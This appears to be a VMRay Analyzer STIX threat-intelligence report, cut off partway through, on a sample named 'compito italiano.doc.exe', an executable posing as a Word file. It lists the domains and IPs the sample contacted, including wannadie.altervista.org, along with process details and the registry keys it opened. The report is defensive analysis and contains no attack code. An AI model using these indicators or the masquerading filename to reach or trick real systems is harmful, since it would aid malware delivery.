<stix:STIX_Package 
	xmlns:CustomObj="http://cybox.mitre.org/objects#CustomObject-1"
	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
	xmlns:AddressObj="http://cybox.mitre.org/objects#AddressObject-2"
	xmlns:ProcessObj="http://cybox.mitre.org/objects#ProcessObject-2"
	xmlns:DNSRecordObj="http://cybox.mitre.org/objects#DNSRecordObject-2"
	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
	xmlns:WinRegistryKeyObj="http://cybox.mitre.org/objects#WinRegistryKeyObject-2"
	xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2"
	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
	xmlns:cybox="http://cybox.mitre.org/cybox-2"
	xmlns:indicator="http://stix.mitre.org/Indicator-2"
	xmlns:stixCommon="http://stix.mitre.org/common-1"
	xmlns:ttp="http://stix.mitre.org/TTP-1"
	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
	xmlns:stix="http://stix.mitre.org/stix-1"
	xmlns:VMRayAnalyzer="http://vmray.com/analyzer"
	xmlns:xlink="http://www.w3.org/1999/xlink"
	xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
	xmlns:xs="http://www.w3.org/2001/XMLSchema"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	
	xsi:schemaLocation="http://cybox.mitre.org/objects#CustomObject-1 http://cybox.mitre.org/XMLSchema/objects/Custom/1.1/Custom_Object.xsd
	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
	http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd
	http://cybox.mitre.org/objects#ProcessObject-2 http://cybox.mitre.org/XMLSchema/objects/Process/2.1/Process_Object.xsd
	http://cybox.mitre.org/objects#DNSRecordObject-2 http://cybox.mitre.org/XMLSchema/objects/DNS_Record/2.1/DNS_Record_Object.xsd
	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.2.0/stix_default_vocabularies.xsd
	http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd
	http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd
	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.2/indicator.xsd
	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.2/stix_common.xsd
	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.2/ttp.xsd
	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.2/stix_core.xsd" id="VMRayAnalyzer:Package-dbf2bf40-f8ad-4c5f-985d-f7254e035d9b" version="1.2">
    <stix:STIX_Header>
        <stix:Title>VMRay Analyzer Report for Sample #709184</stix:Title>
        <stix:Information_Source>
            <stixCommon:Tools>
                <cyboxCommon:Tool>
                    <cyboxCommon:Name>VMRay Analyzer</cyboxCommon:Name>
                    <cyboxCommon:Version>3.2.2</cyboxCommon:Version>
                </cyboxCommon:Tool>
            </stixCommon:Tools>
        </stix:Information_Source>
    </stix:STIX_Header>
    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
        <cybox:Observable id="VMRayAnalyzer:Observable-46bacb37-a93e-4040-b3a0-2c469c6f234a">
            <cybox:Title>URI</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:URI-6a68f032-222f-44d4-aaae-fc15b7d249ba">
                <cybox:Properties xsi:type="URIObj:URIObjectType" type="Domain Name">
                    <URIObj:Value>www.google.com</URIObj:Value>
                </cybox:Properties>
                <cybox:Related_Objects>
                    <cybox:Related_Object idref="VMRayAnalyzer:Address-d0c4aafc-39e9-4641-9661-b74a74849099">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
                    </cybox:Related_Object>
                </cybox:Related_Objects>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-1d1e90f9-7ad5-45f6-af39-05bf324f4c28">
            <cybox:Title>Address</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:Address-d0c4aafc-39e9-4641-9661-b74a74849099">
                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
                    <AddressObj:Address_Value>172.217.21.196</AddressObj:Address_Value>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-f94b68a8-82e2-41c0-ad58-53b8f1b78c38">
            <cybox:Title>URI</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:URI-d8f86d99-1040-4cae-82b6-7f6ae6c2329c">
                <cybox:Properties xsi:type="URIObj:URIObjectType" type="Domain Name">
                    <URIObj:Value>wannadie.altervista.org</URIObj:Value>
                </cybox:Properties>
                <cybox:Related_Objects>
                    <cybox:Related_Object idref="VMRayAnalyzer:Address-d503fae7-13b1-47dd-82a9-3fbd2e08ab8e">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Resolved_To</cybox:Relationship>
                    </cybox:Related_Object>
                </cybox:Related_Objects>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-90b6eb8a-6a8d-41a3-adfc-268365a7102c">
            <cybox:Title>Address</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:Address-d503fae7-13b1-47dd-82a9-3fbd2e08ab8e">
                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
                    <AddressObj:Address_Value>51.75.240.53</AddressObj:Address_Value>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-ac7c4ce4-28d5-4851-a6f6-2eb25c7dc2b3">
            <cybox:Title>Process</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:Process-8016a66c-b5a2-4363-9796-277eeb1686f2">
                <cybox:Properties xsi:type="ProcessObj:ProcessObjectType">
                    <cyboxCommon:Custom_Properties>
                        <cyboxCommon:Property name="monitored_id">1</cyboxCommon:Property>
                    </cyboxCommon:Custom_Properties>
                    <ProcessObj:PID>3332</ProcessObj:PID>
                    <ProcessObj:Name>compito italiano.doc.exe</ProcessObj:Name>
                    <ProcessObj:Parent_PID>1376</ProcessObj:Parent_PID>
                    <ProcessObj:Image_Info>
                        <ProcessObj:File_Name>compito italiano.doc.exe</ProcessObj:File_Name>
                        <ProcessObj:Command_Line>"C:\Users\FD1HVy\Desktop\compito italiano.doc.exe" </ProcessObj:Command_Line>
                        <ProcessObj:Current_Directory>C:\Users\FD1HVy\Desktop\</ProcessObj:Current_Directory>
                        <ProcessObj:Path>c:\users\fd1hvy\desktop\compito italiano.doc.exe</ProcessObj:Path>
                    </ProcessObj:Image_Info>
                </cybox:Properties>
                <cybox:Related_Objects>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-505231f0-2850-42c6-b475-09ea9fab2a84">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-e055ed2a-5e6b-4986-a600-1cd3906bf948">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-a377cefe-b519-4483-a0fe-b180e4340968">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-f837b6a1-ae5a-46fa-97be-a7cb9d54d684">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-242ab230-8c66-4100-807f-f745deb7d22c">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-d9464988-db22-4bf2-a0f4-82a5bde2bfe4">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-6eeae294-0513-46fb-bffc-b40c56346ea9">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-6fd20cc9-ccfc-4e5d-b455-2dbf249415b5">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-9293103e-31c9-4486-b3bc-2656e8480c9c">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-63ade178-98fe-470a-a86f-310261d68dab">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-7c7022c8-6ac1-4ded-afcb-152ded083a55">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-e2083ca1-87c7-49c5-beb6-8af602a4111f">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-fa27e157-8d04-474b-874a-4070c0a95841">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-e6c9f275-2291-432a-a659-948b6521e070">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-93aebf0e-3c2c-4af1-88ba-3d13dca42429">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-2eb47459-15cb-4495-a480-ed74136d5f92">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-854a1e7d-dac0-4176-b534-9c38badf418e">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-bd37f084-8be9-4c32-bce6-9985905f475b">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-65a80913-ed15-4a4c-b14c-f64b6c4f0b25">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-9f87d21c-0bc5-4770-8aca-80107af1131f">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:WinRegistryKey-398306e3-f2bd-4685-a45b-310398069730">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:DNSRecord-11042299-b2d0-4e5f-9df2-6cc36d3dd43b">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Read_From</cybox:Relationship>
                    </cybox:Related_Object>
                    <cybox:Related_Object idref="VMRayAnalyzer:DNSRecord-d3f300be-a34f-4fcb-8dfc-e3a5f7c96a2a">
                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Read_From</cybox:Relationship>
                    </cybox:Related_Object>
                </cybox:Related_Objects>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-3203e430-cbdd-4e02-9b32-c5658c59a590">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-505231f0-2850-42c6-b475-09ea9fab2a84">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\AppContext</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-520c2bef-9aa0-44df-a334-c8d4843af06b">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-e055ed2a-5e6b-4986-a600-1cd3906bf948">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\XML</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-161d9605-20cd-4dc1-a122-29b9ba217284">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-a377cefe-b519-4483-a0fe-b180e4340968">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\XML</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_CURRENT_USER</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-c042d845-184f-4536-a2dc-beda9b2e83e6">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-f837b6a1-ae5a-46fa-97be-a7cb9d54d684">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>Software\Microsoft\.NETFramework</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>DbgJITDebugLaunchSetting</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>DbgManagedDebugger</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-60089aac-e859-42b4-85bc-a9690d30f43e">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-242ab230-8c66-4100-807f-f745deb7d22c">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>Software\Microsoft\Windows NT\CurrentVersion</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>InstallationType</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>InstallationType</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-d039a796-d0d7-49fb-99d8-448d88d7a38f">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-d9464988-db22-4bf2-a0f4-82a5bde2bfe4">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key/>
                    <WinRegistryKeyObj:Hive>HKEY_CURRENT_USER</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-5451f2be-9a4a-4aa2-9d0d-8c39f908c741">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-6eeae294-0513-46fb-bffc-b40c56346ea9">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_CURRENT_USER</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-266d9c47-fa11-49e1-be7c-2ba1de4ae1f5">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-6fd20cc9-ccfc-4e5d-b455-2dbf249415b5">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-fead171a-39d6-4f04-b3f2-148637f8fa6b">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-9293103e-31c9-4486-b3bc-2656e8480c9c">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-fa5579d9-0f8a-40b9-9676-d9ee097a14a1">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-63ade178-98fe-470a-a86f-310261d68dab">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>LegacyWPADSupport</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-98bd9ad1-9d57-4c22-9491-d246e28930fd">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-7c7022c8-6ac1-4ded-afcb-152ded083a55">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones\W. Europe Standard Time</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>TZI</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Display</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Display</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Std</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Std</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Dlt</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>MUI_Dlt</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-f6aa7795-d92f-4faf-b21d-923e7be1544c">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-e2083ca1-87c7-49c5-beb6-8af602a4111f">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones\W. Europe Standard Time\Dynamic DST</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-27c1da50-0b05-4c61-ae54-0c13d22cc445">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-fa27e157-8d04-474b-874a-4070c0a95841">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>HWRPortReuseOnSocketBind</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-fe8d5c3d-7518-40e8-b463-dc9eeae4757d">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-e6c9f275-2291-432a-a659-948b6521e070">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319\System.Net.ServicePointManager.SchSendAuxRecord</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-bae68e3f-c0dc-400c-be68-f9d22daa1260">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-93aebf0e-3c2c-4af1-88ba-3d13dca42429">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319\System.Net.ServicePointManager.SystemDefaultTlsVersions</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-c75aad3c-0d42-4ea0-9add-2141178641d9">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-2eb47459-15cb-4495-a480-ed74136d5f92">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319\System.Net.ServicePointManager.RequireCertificateEKUs</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-f7d78354-5f1e-4782-90c7-2420ce60cea7">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-854a1e7d-dac0-4176-b534-9c38badf418e">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319\System.Net.ServicePointManager.SecurityProtocol</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-473ffbb3-b96c-42a9-9f78-f4412ecfa2d3">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-bd37f084-8be9-4c32-bce6-9985905f475b">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>SchUseStrongCrypto</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-82eb3c4a-618d-41b2-a691-cb137b7f68d8">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-65a80913-ed15-4a4c-b14c-f64b6c4f0b25">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>SchSendAuxRecord</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-417eac6c-f87b-468d-b533-57e1b99af456">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-9f87d21c-0bc5-4770-8aca-80107af1131f">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
